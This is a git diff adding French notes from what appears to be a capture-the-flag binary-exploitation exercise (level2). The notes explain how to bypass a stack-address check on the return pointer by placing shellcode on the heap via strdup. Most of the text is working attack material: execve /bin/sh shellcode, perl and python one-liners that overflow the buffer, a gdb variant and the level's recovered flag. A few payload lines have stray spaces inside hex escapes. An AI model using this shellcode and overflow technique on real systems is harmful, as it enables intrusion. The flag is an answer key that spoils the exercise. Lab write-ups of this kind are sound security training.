@@ -56,3 +56,48 @@ perl -e 'print "\x90"x49 . "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48
 
 
 perl -e 'print "A"x50 . "\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80" . "\xd8\xf6\xff\xbf" . "\x4a\x85\x04\x08" . "AAAA" . "BBBB" . "CCCC" . "\xd3\x54\xe4\xb7"' > /tmp/injectx
+
+
+esp < -114 > 
+^
+| 
+| < -76 > Buffer de 76 
+|    |
+|    |
+|    |
+|    |
+|    |  < -12 > sauvegarde EIP
+|    |      |
+|    |      |
+ebp < +0 >
+|    |
+| < +4 > eip
+|    |
+|    V
+
+
+dans la fonction <p>
+Verification de l'adresse de retour (eip) avec une comparaison (0xb000000). Si l'adresse commence par 0xb => est dans la stack.
+c'est donc une protection pour éviter que l'on exécute du code présent sur la stack.
+
+On a un strdup qui duplique la string, récupérée par le 'gets'
+Si on regarde le strdup, il appelle malloc qui va lui stocker la string sur le tas (heap)
+Il faut donc entrer le shellcode dans la string mais réécrire eip avec cette adresse sur le tas qui ne commence pas par 0xb...
+
+
+Comme on peut le voir ci-dessus, il faut écrire 76 chars pour remplir le buffer (dont le shell code) + 4 chars qui vont écraser ebp + l'adresse sur 4 octets visée sur la heap
+Notre shellcode => "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
+Longueur du shellcode : 45
+shellcode + 35 chars + adresse
+ou 
+20 x '\90' + shellcode (45) + 15 x 'B' + '\x08\xa0\x04\x08'
+
+
+(python -c "print ('\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x 89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'B' * 35 + '\x08\xa0\x04\x08')"; cat) | /home/user/level2/level2
+(python -c "print ('\x90' * 5 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\ x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'B' * 30 + '\x08\xa0\x04\x08')"; cat) | /home/user/level2/level2
+(python -c "print ('\x90' * 5 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\ x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'B' * 30 + '\x0c\xa0\x04\x08')"; cat) | /home/user/level2/level2
+
+dans gdb : <<< $(python -c "print ('\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'B' * 35 + '\x08\xa0\x04\x08')")
+
+
+flag => 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
